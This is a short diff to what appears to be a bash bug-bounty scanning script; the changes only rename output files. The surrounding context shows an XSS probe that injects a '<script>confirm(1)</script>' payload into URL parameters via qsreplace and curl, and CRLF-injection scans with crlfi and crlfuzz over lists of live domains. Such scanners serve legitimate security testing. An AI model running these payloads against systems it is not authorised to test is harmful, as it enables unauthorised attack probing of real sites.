@@ -128,7 +128,7 @@ cat all_params.txt | qsreplace '"/><script>confirm(1)</script>' > xss.txt
 while read host; do
     echo "[+] Testing: $host"
     if curl --silent --path-as-is --insecure "$host" | grep -q "confirm(1)"; then
-        echo "$host [VULNERABLE]" | tee -a xss_results.txt
+        echo "$host [VULNERABLE]" | tee -a xss_curl_results.txt
     else
         echo "$host [Not Vulnerable]" | tee -a xss_curl_results.txt
     fi
@@ -198,7 +198,7 @@ echo "[*] CRLF Injection with crlfi..."
 crlfi -i livedomains.txt -o crlf_crlfi.txt
 
 echo "[*] CRLF Injection with crlfuzz (domains)..."
-crlfuzz -l livedomains.txt | tee -a crlf_crlfsuite_domains.txt
+crlfuzz -l livedomains.txt | tee -a crlf_crlfuzz.txt
 
 echo "[*] CRLF Injection with crlfuzz (URLs)..."
 crlfuzz -l all_urls.txt | tee -a crlf_crlfsuite_urls.txt
